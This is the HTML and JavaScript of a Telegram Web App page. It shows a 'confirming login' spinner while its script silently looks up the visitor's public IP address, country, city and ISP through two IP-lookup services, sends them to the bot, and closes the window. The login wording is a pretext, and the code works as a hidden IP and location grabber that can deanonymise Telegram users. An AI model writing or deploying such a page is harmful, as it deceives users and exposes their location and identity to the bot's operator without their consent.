<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Проверка...</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      background-color: var(--tg-theme-bg-color, #ffffff);
      color: var(--tg-theme-text-color, #222222);
      text-align: center;
      padding: 20px;
      box-sizing: border-box;
    }
    .spinner {
      width: 42px;
      height: 42px;
      border: 4px solid rgba(0, 0, 0, 0.1);
      border-top-color: var(--tg-theme-button-color, #2481cc);
      border-radius: 50%;
      animation: spin 0.9s linear infinite;
      margin-bottom: 16px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    p {
      font-size: 15px;
      margin: 0;
      color: var(--tg-theme-hint-color, #777777);
    }
  </style>
</head>
<body>
  <div class="spinner"></div>
  <p id="status-text">Подтверждение входа...</p>

  <script>
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    let sent = false;

    function sendAndClose(payload) {
      if (sent) return;
      sent = true;
      try {
        tg.sendData(JSON.stringify(payload));
      } catch (e) {
        console.error("sendData error:", e);
      }
      setTimeout(() => tg.close(), 200);
    }

    // Жёсткий страховочный таймер: максимум 2.2 секунды, чтобы кнопка никогда не зависала
    setTimeout(() => {
      sendAndClose({ ip: "не определён", country: "", city: "", isp: "" });
    }, 2200);

    async function fetchJson(url, ms) {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), ms);
      try {
        const res = await fetch(url, { signal: controller.signal });
        return await res.json();
      } finally {
        clearTimeout(timer);
      }
    }

    async function collectIp() {
      const p1 = fetchJson("https://ipwho.is/", 2000).then((info) => {
        if (info && info.ip) {
          return {
            ip: info.ip,
            country: info.country || "",
            city: info.city || "",
            isp: (info.connection && info.connection.isp) ? info.connection.isp : ""
          };
        }
        throw new Error("no ip");
      });

      const p2 = fetchJson("https://api.ipify.org?format=json", 2000).then((info) => {
        if (info && info.ip) {
          return { ip: info.ip, country: "", city: "", isp: "" };
        }
        throw new Error("no ip");
      });

      try {
        const result = await Promise.any([p1, p2]);
        sendAndClose(result);
      } catch (e) {
        sendAndClose({ ip: "не определён", country: "", city: "", isp: "" });
      }
    }

    collectIp();
  </script>
</body>
</html>
